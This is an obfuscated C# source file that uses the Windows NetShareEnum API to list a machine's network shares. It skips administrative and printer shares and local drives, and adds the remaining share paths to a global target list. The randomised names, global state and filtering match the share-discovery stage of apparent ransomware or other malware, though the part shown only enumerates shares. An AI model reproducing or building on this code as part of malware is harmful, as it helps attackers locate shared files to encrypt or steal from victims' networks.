using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace YzTymtbtgFABHvJvj;

public class FXhMQTnvOItBEVU
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct vHLAyLwLEHILuZr
	{
		public string BpcAcUGdKb;

		public uint aQLaooxxVKpA;

		public string zyafCWCwcMBnJJsA;

		public vHLAyLwLEHILuZr(string sharename, uint sharetype, string remark)
		{
			BpcAcUGdKb = sharename;
			aQLaooxxVKpA = sharetype;
			zyafCWCwcMBnJJsA = remark;
		}

		public override string ToString()
		{
			return BpcAcUGdKb;
		}
	}

	private enum EEkhecTWBxHpFl : uint
	{
		SvUcaSSabPc = 0u,
		LKpoibJjhfEM = 2100u,
		MDSratvgEX = 2116u,
		qmVbVnJOfhxV = 2118u,
		ZNqygxJdiuEev = 2123u
	}

	private enum scTdksqJMRVbUG : uint
	{
		YTBacnJbaoU = 0u,
		fHrmvSWYNDujd = 1u,
		KgFZMOJuaZKJ = 2u,
		XIeliqCBlhmX = 3u,
		uzfQMjFIpfZifMZ = 2147483648u
	}

	private const uint qkxCCGbyyNch = uint.MaxValue;

	private const int SvUcaSSabPc = 0;

	public vHLAyLwLEHILuZr[] KwbVgfIQbH(string gzTUBupTPiVaK)
	{
		List<vHLAyLwLEHILuZr> list = new List<vHLAyLwLEHILuZr>();
		int XaLpnBDcUXUHMb = 0;
		int SdjGFnuxDPlq = 0;
		int cAygLQhAqjBVG = 0;
		int num = Marshal.SizeOf(typeof(vHLAyLwLEHILuZr));
		IntPtr rpVGmzztol = IntPtr.Zero;
		StringBuilder bFuLHiHEogrCV = new StringBuilder(gzTUBupTPiVaK);
		int num2 = NetShareEnum(bFuLHiHEogrCV, 1, ref rpVGmzztol, uint.MaxValue, ref XaLpnBDcUXUHMb, ref SdjGFnuxDPlq, ref cAygLQhAqjBVG);
		if (num2 == 0)
		{
			IntPtr ptr = rpVGmzztol;
			for (int i = 0; i < XaLpnBDcUXUHMb; i++)
			{
				vHLAyLwLEHILuZr item = (vHLAyLwLEHILuZr)Marshal.PtrToStructure(ptr, typeof(vHLAyLwLEHILuZr));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(rpVGmzztol);
			return list.ToArray();
		}
		list.Add(new vHLAyLwLEHILuZr("ERROR=" + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr CtKWKNpHuxwA);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder bFuLHiHEogrCV, int nhAQvnGNXfdAMf, ref IntPtr rpVGmzztol, uint wPKrdXgiPbxhMKhft, ref int XaLpnBDcUXUHMb, ref int SdjGFnuxDPlq, ref int cAygLQhAqjBVG);

	public static void FeBWuyvetkIdDG()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			vHLAyLwLEHILuZr[] array = new FXhMQTnvOItBEVU().KwbVgfIQbH(Environment.MachineName);
			vHLAyLwLEHILuZr[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				vHLAyLwLEHILuZr vHLAyLwLEHILuZr = array2[i];
				if (vHLAyLwLEHILuZr.ToString().Contains("ADMIN$") || vHLAyLwLEHILuZr.ToString().Contains("print$") || vHLAyLwLEHILuZr.ToString().Contains("User") || vHLAyLwLEHILuZr.ToString().Contains("IPC$") || logicalDrives.Contains(vHLAyLwLEHILuZr.ToString().Replace("$", ":\\")))
				{
					continue;
				}
				if (!eqCksjvMyn.vNjCRxJChaZG.Contains("\\\\" + Environment.MachineName + "\\" + vHLAyLwLEHILuZr))
				{
					eqCksjvMyn.vNjCRxJChaZG.Add("\\\\" + Environment.MachineName + "\\" + vHLAyLwLEHILuZr);
				}
				if (eqCksjvMyn.aLMUqgosPdtj)
				{
					try
					{
						Console.WriteLine("Share Added: {0}", "\\\\" + Environment.MachineName + "\\" + vHLAyLwLEHILuZr);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (eqCksjvMyn.nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(eqCksjvMyn.zRTqZqtXid, "Error while enumerating shares: " + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
